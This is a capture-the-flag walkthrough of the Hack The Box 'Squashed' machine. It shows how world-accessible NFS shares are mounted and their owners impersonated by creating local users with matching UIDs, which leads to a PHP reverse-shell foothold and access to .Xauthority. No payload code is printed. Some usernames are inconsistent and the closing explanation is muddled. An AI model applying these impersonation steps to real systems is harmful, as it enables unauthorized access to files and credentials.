# Machine abstract
This Linux machine exhibits misconfigurations in its NFS shares, enabling attackers to exploit user impersonation vulnerabilities. Such vulnerabilities allow malicious actors to upload files that establish reverse connections. Additionally, to gain root access on the machine, exploitation of an X11 display vulnerability is required.

## Skills Learned
- Spotting and leveraging NFS misconfigurations
- Managing users via the Linux command line
- Enumerating and understanding a system running X11

The nmap scan shows a standard SSH service running on port 22 , an Apache webserver running on port 80 , as well as NFS and rpcbind running on their default ports.

## Enumerating NFS


NFS is a server/client system enabling users to share files and directories across a network and allowing those shares to be mounted locally. While both useful and versatile, NFS has no protocol for authorization or authentication, making it a common pitfall for misconfiguration and therefore exploitation.
We begin our enumeration by listing any potentially available shares hosted on the target machine

```bash
└─# showmount -e 10.10.11.191 
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

We can see two globally accessible file-shares, as indicated by the star. We can have a look at their contents by mounting the directories.

After mounting the directory, we can see the contents of the file but with no access to the directory
```bash
└─#     
mount.nfs: mount point /mnt/1 does not exist
                                                                                                                                           
└─# mkdir /mnt/1                                     
                                                                                                                                           
└─# sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/1 
                                                                                                                                           
└─# ls -sail /mnt/1   
ls: cannot access '/mnt/1/.': Permission denied
ls: cannot access '/mnt/1/..': Permission denied
ls: cannot access '/mnt/1/index.html': Permission denied
ls: cannot access '/mnt/1/images': Permission denied

? ? ?????????? ? ? ? ?            ? index.html
? ? ?????????? ? ? ? ?            ? js
```

Checking the file ownership, it's owned by `xela`

```bash
└─# ls -ldn /mnt/1
drwxr-xr-- 5 2017 33 4096 Apr 25 10:10 /mnt/1
                                                     
```

We can see that the directory is owned by the UID 2017, and belongs to the group with the ID of www-data , or 33 . 

the second nfs had a kdbx password file and the contents of the whole directory with no permissions restrictions

```bash
/mnt/2/Documents:
total 12
39114 4 drwxr-xr-x  2 MGeorge MGeorge 4096 Oct 21  2022 .
30718 4 drwxr-xr-x 14 MGeorge MGeorge 4096 Apr 25 09:45 ..
39343 4 -rw-rw-r--  1 MGeorge MGeorge 1365 Oct 19  2022 Passwords.kdbx
```


## HTTP
Upon navigating to port 80 , we find a template for a furniture store website with dead links


![Alt text](/assets/img/htb/Squashe/s1.png)

But if you gobuster scan you will see similar content as with the 1st nfs /mnt/1


```bash
└─# cat gobuster.out 
/images               (Status: 301) [Size: 313] [--> http://10.10.11.191/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.191/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.191/js/]
```                                                                     
So if we can write to the nfs file we can upload a malicious payload to give us a reverse shell

# Foothold
1st  we can mount the directory that hosts the files of the webserver, we have no permission to read nor write any data to it. 2nd directory is owned by a certain UID of 2017 . and since NFS has no mechanism for authentication or authorization whatsoever, by assuming the identity of the share's owner, we also assume their permissions on the directory itself.

## NFS Imitation
The plan now is to imitate the user with the UID of 2017 , try adding a php file containing our reverse shell to the webserver and then use our browser to trigger it.
We start by creating a new user on our local machine, and assign them the respective UID.

```bash
sudo useradd xela
```

This user will by default have a UID/GID of the highest ID found in /etc/passwd , plus one. Usually this will be 1001 . To change the UID, we run the following command:

```bash
sudo usermod -u 2017 xela
```
In theory, we can leave the GID as is, but for complecity's sake we can change it as follows, using groupmod .

```bash
sudo groupmod -g 2017 xela
```

We can verify our new user's data by taking a look at our /etc/passwd file.

```bash
┌──(root㉿kali)-[/home/…/Documents/CTFs/HackTheBox/Squashed]
└─# cat /etc/passwd | grep xela
xela:x:2017:2017::/home/xela:/bin/sh
```

Having created our impostor user, we should now be able to interact with the share mounted on /mount/1 ,namely /var/www/html , by using su to run commands as xela.

```bash
sudo su xela
```

and now we can read and write to the file system

```bash
xela@kali:/mnt$ id
uid=2017(xela) gid=2017(xela) groups=2017(xela)
xela@kali:/mnt$ cd 1
xela@kali:/mnt/1$ ls
css  images  index.html  js
xela@kali:/mnt/1$ ls -sail
total 52
 133456  4 drwxr-xr-- 5 xela www-data  4096 Apr 25 10:35 .
1835009  4 drwxr-xr-x 5 root root      4096 Apr 25 10:12 ..
 157034  4 drwxr-xr-x 2 xela www-data  4096 Apr 25 10:35 css
 157035  4 drwxr-xr-x 2 xela www-data  4096 Apr 25 10:35 images
 132693 32 -rw-r----- 1 xela www-data 32532 Apr 25 10:35 index.html
 157036  4 drwxr-xr-x 2 xela www-data  4096 Apr 25 10:35 js
xela@kali:/mnt/1$ 

```

After uploading a malicious php file, I successfully got a shell back with uid=2017(alex)

# Privilege Escalation
## NFS Imitation 2.0

we need to imitate UID/GID 1001 in order to read its contents; we locally apply the same commands as with xela :

```bash
└─# ls -sail
total 68
  30718 4 drwxr-xr-x 14 1001 1001 4096 Apr 25 11:13 .
1835009 4 drwxr-xr-x  5 root root 4096 Apr 25 10:12 ..

  39117 4 drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Videos
  39128 0 lrwxrwxrwx  1 root root    9 Oct 21  2022 .viminfo -> /dev/null
  39207 4 -rw-------  1 1001 1001   57 Apr 25 11:13 .Xauthority
   5606 4 -rw-------  1 1001 1001 2475 Apr 25 11:13 .xsession-errors
   5632 4 -rw-------  1 1001 1001 2475 Dec 27  2022 .xsession-errors.old
```

Now we need to creat a new user with uid 1001 to read and access the file content of 2

```bash
└─# sudo useradd ross       
                                                                                                                    
└─# sudo usermod -u 1001 ross
                                                                                                                        
└─# sudo groupmod -g 1001 ross
```

Checking the configuration of the NFS , indeed it was misconfigured in that changes are immediately written to disk before any operation is considered complete, which ensures data integrity but can impact performance. with the help of `sync`
